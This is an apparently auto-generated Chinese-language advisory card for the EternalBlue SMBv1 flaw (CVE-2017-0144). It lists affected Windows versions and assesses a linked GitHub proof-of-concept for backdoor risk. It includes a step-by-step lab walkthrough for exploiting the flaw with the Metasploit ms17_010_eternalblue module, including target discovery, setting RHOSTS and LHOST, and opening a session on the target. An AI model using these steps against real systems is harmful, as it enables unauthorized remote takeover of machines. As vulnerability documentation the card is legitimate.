## CVE-2017-0144 - EternalBlue SMBv1 远程代码执行

**漏洞编号:** CVE-2017-0144

**漏洞类型:** 远程代码执行

**影响应用:** Windows SMBv1

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8.1, Windows Server 2012 Gold and R2, Windows RT 8.1, Windows 10 Gold, 1511, and 1607, Windows Server 2016

**利用条件:** 目标系统开启 SMBv1 服务，攻击者需要与目标系统网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-0144，也被称为 EternalBlue，是一个存在于 Microsoft Windows SMBv1 服务器中的远程代码执行漏洞。攻击者可以通过发送特制的 SMB 数据包利用此漏洞，无需身份验证即可在目标系统上执行任意代码。提供的漏洞利用代码描述了一个使用 Metasploit 框架来利用此漏洞的步骤。它包括设置目标 IP 地址 (RHOSTS) 和攻击者 IP 地址 (LHOST)，然后运行 exploit。由于涉及下载和执行第三方脚本，存在一定风险。虽然代码本身看起来是为了演示漏洞利用过程，但潜在的恶意作者可能会修改脚本以包含恶意负载或后门。此外，直接从在线来源复制和粘贴代码而不进行彻底审查也存在风险。例如，`set LHOST eth0` 命令需要小心，因为 `eth0` 接口可能并非所有 Kali Linux 安装的默认接口。 如果 `eth0` 不存在，exploit 会失败，或者更糟，会尝试使用错误的接口，从而暴露本地网络。

该POC的利用方式如下：

1.  设置环境：搭建包含存在漏洞的Windows Server（或客户端）的靶机环境，并配置Kali Linux攻击机。
2.  网络配置：确保攻击机和靶机在同一网络内，或者攻击机可以路由到靶机。
3.  关闭防火墙：在Windows靶机上，关闭防火墙以避免拦截攻击流量。（生产环境中不应这样做）
4.  Kali Linux准备：启动Kali Linux，确保系统时间和时区设置正确。
5.  发现目标：使用 `netdiscover` 命令扫描局域网，找到目标Windows靶机的IP地址。
6.  端口扫描：使用 `nmap -O [目标IP]` 扫描目标主机，确认其操作系统版本，并验证445端口（SMB端口）是否开放。
7.  Metasploit启动：在Kali Linux中启动 Metasploit 框架 (msfconsole)。
8.  选择EternalBlue模块：使用 `use exploit/windows/smb/ms17_010_eternalblue` 命令选择 EternalBlue 漏洞利用模块。
9.  配置参数：
    *   `set RHOSTS [目标IP地址]`：设置目标Windows系统的IP地址。
    *   `set LHOST [Kali Linux IP地址]`：设置攻击机（Kali Linux）的IP地址。  注意：POC中此处有风险, 需要用户确认网络接口名,否则会导致渗透失败.
10. 运行Exploit：使用 `run` 或 `exploit` 命令开始漏洞利用。
11. 成功利用：如果漏洞利用成功，Metasploit 会话将建立，攻击者可以在目标系统上执行命令。

投毒风险分析：
提供的代码主要是一个教程，指导用户如何使用现有的 EternalBlue Metasploit 模块。虽然该教程本身没有包含明显的恶意代码，但是如果用户不小心，仍然存在风险：

*   LHOST设置错误：教程中`set LHOST eth0`可能导致用户设置错误的监听IP，虽然不会直接造成投毒，但会导致利用失败甚至暴露攻击者的内网结构。
*   依赖Metasploit：EternalBlue 漏洞的利用严重依赖Metasploit框架。如果用户使用的Metasploit版本被篡改，存在被植入后门的风险。
*   执行未知Payload：即使EternalBlue模块本身没有问题，用户如果加载了恶意的Payload，也会导致被投毒。例如，在获得shell之后，用户可能会执行从互联网上下载的恶意脚本。

因此，虽然教程本身没有明显的投毒代码，但用户在使用过程中仍需保持警惕，确保环境安全，并验证所使用的工具和Payload的来源。

**项目地址:** [AbbeAlthany/Windows-7_och_CVE-2017-0144_Exploit](https://github.com/AbbeAlthany/Windows-7_och_CVE-2017-0144_Exploit)

**漏洞详情:** [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)